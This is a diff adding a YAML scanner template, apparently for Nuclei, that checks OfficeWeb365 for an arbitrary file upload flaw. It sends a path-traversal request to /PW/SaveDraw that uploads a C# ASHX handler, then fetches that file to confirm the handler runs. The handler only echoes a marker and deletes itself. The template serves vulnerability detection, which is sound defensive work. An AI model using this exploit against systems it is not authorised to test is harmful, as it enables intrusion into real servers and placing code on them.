@@ -1,0 +1,53 @@
+id: officeweb365-file-upload
+info:
+  name: OfficeWeb365 - 任意文件上传漏洞
+  author: Chaitin
+  severity: high
+  metadata:
+    verified: true
+    max-request: 2
+    vuln-id: CT-756407
+    vendor: officeweb365
+    product: officeweb365
+  tags: file-upload,vuln,officeweb365
+variables:
+  s2: '{{to_lower(rand_text_alpha(8))}}'
+  s3: '{{to_lower(rand_text_alpha(8))}}'
+  randomHash: '{{md5(s3)}}'
+flow: http(1) && http(2)
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/PW/SaveDraw?path=../../Content/img&idx={{s2}}.ashx'
+    redirects: false
+    body: |-
+      data:image/png;base64,{{randomHash}}<%@ Language="C#" Class="Handler1" %>public class Handler1:System.Web.IHttpHandler
+      {
+      public void ProcessRequest(System.Web.HttpContext context)
+      {
+      System.Web.HttpResponse response = context.Response;
+      response.Write("{{s3}}");
+
+      string filePath = context.Server.MapPath("/") + context.Request.Path;
+      if (System.IO.File.Exists(filePath))
+      {
+          System.IO.File.Delete(filePath);
+      }
+      }
+      public bool IsReusable
+      {
+      get { return false; }
+      }
+      }///---
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "ok")'
+  - method: GET
+    path:
+      - '{{BaseURL}}/Content/img/UserDraw/drawPW{{s2}}.ashx'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, s3)'
